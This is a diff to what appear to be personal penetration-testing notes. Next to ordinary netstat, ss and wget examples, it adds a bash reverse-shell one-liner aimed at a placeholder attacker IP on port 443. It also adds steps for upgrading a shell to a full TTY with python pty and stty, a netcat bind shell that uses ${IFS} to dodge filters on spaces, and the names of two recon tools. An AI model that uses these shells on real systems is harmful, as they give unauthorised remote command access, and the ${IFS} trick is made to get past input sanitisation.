@@ -22,7 +22,7 @@ netstat -tuln
 - `-l`: Show only listening ports
 - `-n`: Show numerical addresses instead of resolving hostnames
 
-2. Using `ss` (a more modern replacement for `netstat`):
+2. Using `ss` (socket satistics) (a more modern replacement for `netstat`):
 
 ```bash
 ss -tuln
@@ -54,3 +54,26 @@ wget -m -p -E -k -np www.example.com
 
 ```
 
+Fully working PTY:
+
+```
+bash -c "bash -i >& /dev/tcp/{your_IP}/443 0>&1"
+```
+
+```
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+^Z bg
+stty -a
+echo $TERM
+stty raw -echo
+fg
+export TERM=...
+stty rows xx columns yy
+```
+
+2 new tools to use
+`reconscan`, `autorecon` 
+
+```
+nc${IFS}-l${IFS}-p1337${IFS}-e/bin/sh
+```
